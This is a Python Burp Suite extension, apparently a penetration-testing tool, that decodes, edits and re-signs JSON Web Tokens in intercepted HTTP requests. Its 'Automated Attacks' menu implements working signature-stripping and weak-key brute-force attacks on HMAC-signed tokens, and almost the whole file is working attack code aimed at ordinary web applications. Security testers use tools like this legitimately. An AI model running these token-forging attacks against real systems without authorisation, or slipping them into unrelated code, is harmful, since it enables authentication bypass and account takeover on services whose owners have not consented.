from burp import IBurpExtender, IHttpListener, IContextMenuFactory, IMessageEditorController
from javax.swing import JMenuItem, JTextArea, JButton, JDialog, JPanel, JScrollPane, JTabbedPane, JLabel, JTextField, JOptionPane
from java.awt import BorderLayout, GridLayout
from java.util import ArrayList
import base64
import json
import hmac
import hashlib
class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMessageEditorController):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("Advanced JWT Manipulation Tool by Yasin Saffari")
        self._callbacks.registerHttpListener(self)
        self._callbacks.registerContextMenuFactory(self)
        self._stdout = callbacks.getStdout()
        self._stderr = callbacks.getStderr()
        self._currentMessage = None
        self._currentPayload = None
        self._keys = {"default": "secret"}
        print("Advanced JWT Manipulation Tool loaded")
    def createMenuItems(self, invocation):
        menu = ArrayList()
        menu.add(JMenuItem("Decode JWT", actionPerformed=lambda x: self.show_decode_dialog(invocation)))
        menu.add(JMenuItem("Edit JWT", actionPerformed=lambda x: self.show_edit_dialog(invocation)))
        menu.add(JMenuItem("Manage Keys", actionPerformed=lambda x: self.show_key_management_dialog()))
        menu.add(JMenuItem("Automated Attacks", actionPerformed=lambda x: self.show_attack_options(invocation)))
        return menu
    def show_decode_dialog(self, invocation):
        self._currentMessage = invocation.getSelectedMessages()[0]
        jwt_token = self.extract_jwt(self._currentMessage)
        if jwt_token:
            header, payload, signature = jwt_token.split('.')
            decoded_header = base64.urlsafe_b64decode(header + '==')
            decoded_payload = base64.urlsafe_b64decode(payload + '==')
            decoded_header_json = json.dumps(json.loads(decoded_header), indent=4)
            decoded_payload_json = json.dumps(json.loads(decoded_payload), indent=4)
            self.show_message("Decoded JWT", "Header:\n{}\n\nPayload:\n{}\n\nSignature:\n{}".format(decoded_header_json, decoded_payload_json, signature))
    def show_edit_dialog(self, invocation):
        self._currentMessage = invocation.getSelectedMessages()[0]
        jwt_token = self.extract_jwt(self._currentMessage)
        if jwt_token:
            header, payload, signature = jwt_token.split('.')
            decoded_payload = base64.urlsafe_b64decode(payload + '==')
            decoded_payload_json = json.loads(decoded_payload)
            self._currentPayload = decoded_payload_json
            self.show_edit_window(decoded_payload_json)
    def show_edit_window(self, payload):
        dialog = JDialog()
        dialog.setTitle("Edit JWT Payload")
        dialog.setSize(600, 400)
        panel = JPanel()
        panel.setLayout(BorderLayout())
        textarea = JTextArea(json.dumps(payload, indent=4))
        save_button = JButton("Save", actionPerformed=lambda x: self.save_jwt_payload(textarea.getText(), dialog))
        panel.add(JScrollPane(textarea), BorderLayout.CENTER)
        panel.add(save_button, BorderLayout.SOUTH)
        dialog.add(panel)
        dialog.setVisible(True)
    def save_jwt_payload(self, payload_str, dialog):
        try:
            payload = json.loads(payload_str)
            self._currentPayload = payload
            jwt_token = self.rebuild_jwt(self._currentPayload)
            self.replace_jwt_in_message(jwt_token)
            dialog.dispose()
            self.show_message("JWT Saved", "The JWT has been successfully modified and saved in the request.")
        except Exception as e:
            self.show_message("Error", "Failed to save JWT: {}".format(e))
    def rebuild_jwt(self, payload):
        jwt_token = self.extract_jwt(self._currentMessage)
        if jwt_token:
            header, original_payload, signature = jwt_token.split('.')
            new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            new_signature = self.sign_jwt(header, new_payload, self._keys.get("default", "secret"))
            return "{}.{}.{}".format(header, new_payload, new_signature)
    def sign_jwt(self, header, payload, secret):
        message = "{}.{}".format(header, payload).encode()
        signature = hmac.new(secret.encode(), message, hashlib.sha256).digest()
        return base64.urlsafe_b64encode(signature).decode().rstrip('=')
    def extract_jwt(self, message):
        request_info = self._helpers.analyzeRequest(message)
        headers = request_info.getHeaders()
        for header in headers:
            if header.startswith("Authorization: Bearer "):
                return header.split(" ")[2]
        return None
    def replace_jwt_in_message(self, jwt_token):
        request_info = self._helpers.analyzeRequest(self._currentMessage)
        headers = request_info.getHeaders()
        new_headers = [header for header in headers if not header.startswith("Authorization: Bearer ")]
        new_headers.append("Authorization: Bearer {}".format(jwt_token))
        body = self._currentMessage.getRequest()[request_info.getBodyOffset():].tostring()
        new_request = self._helpers.buildHttpMessage(new_headers, body)
        self._currentMessage.setRequest(new_request)
    def show_message(self, title, message):
        dialog = JDialog()
        dialog.setTitle(title)
        dialog.setSize(400, 300)
        panel = JPanel()
        panel.setLayout(BorderLayout())
        textarea = JTextArea(message)
        textarea.setEditable(False)
        panel.add(JScrollPane(textarea), BorderLayout.CENTER)
        dialog.add(panel)
        dialog.setVisible(True)
    def show_key_management_dialog(self):
        dialog = JDialog()
        dialog.setTitle("Manage Keys")
        dialog.setSize(400, 300)
        panel = JPanel()
        panel.setLayout(GridLayout(0, 2))
        panel.add(JLabel("Key Name"))
        panel.add(JLabel("Secret Key"))
        for key, value in self._keys.items():
            panel.add(JLabel(key))
            panel.add(JTextField(value))
        add_button = JButton("Add Key", actionPerformed=lambda x: self.add_key(panel))
        panel.add(add_button)
        dialog.add(panel)
        dialog.setVisible(True)
    def add_key(self, panel):
        key_name = JOptionPane.showInputDialog("Enter Key Name:")
        key_value = JOptionPane.showInputDialog("Enter Secret Key:")
        if key_name and key_value:
            self._keys[key_name] = key_value
            panel.add(JLabel(key_name))
            panel.add(JTextField(key_value))
            panel.revalidate()
            panel.repaint()
    def show_attack_options(self, invocation):
        self._currentMessage = invocation.getSelectedMessages()[0]
        dialog = JDialog()
        dialog.setTitle("Automated Attacks")
        dialog.setSize(300, 200)
        panel = JPanel()
        panel.setLayout(GridLayout(0, 1))
        strip_signature_button = JButton("Signature Stripping", actionPerformed=lambda x: self.signature_stripping_attack(dialog))
        brute_force_button = JButton("Brute Force Weak Key", actionPerformed=lambda x: self.brute_force_attack(dialog))
        panel.add(strip_signature_button)
        panel.add(brute_force_button)
        dialog.add(panel)
        dialog.setVisible(True)
    def signature_stripping_attack(self, dialog):
        jwt_token = self.extract_jwt(self._currentMessage)
        if jwt_token:
            header, payload, signature = jwt_token.split('.')
            stripped_jwt = "{}.{}.".format(header, payload)
            self.replace_jwt_in_message(stripped_jwt)
            dialog.dispose()
            self.show_message("Signature Stripping", "Signature stripping attack applied. The JWT has been modified.")
    def brute_force_attack(self, dialog):
        jwt_token = self.extract_jwt(self._currentMessage)
        if jwt_token:
            header, payload, signature = jwt_token.split('.')
            wordlist = ["secret", "password", "123456"] #Dear User, you can change it :)
            for key in wordlist:
                if self.verify_jwt_signature(header, payload, signature, key):
                    self.show_message("Brute Force Successful", "Weak key found: {}".format(key))
                    dialog.dispose()
                    return
            self.show_message("Brute Force Failed", "No weak key found in the provided wordlist.")
            dialog.dispose()
    def verify_jwt_signature(self, header, payload, signature, key):
        message = "{}.{}".format(header, payload).encode()
        calculated_signature = hmac.new(key.encode(), message, hashlib.sha256).digest()
        calculated_signature_base64 = base64.urlsafe_b64encode(calculated_signature).decode().rstrip('=')
        return calculated_signature_base64 == signature
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        pass
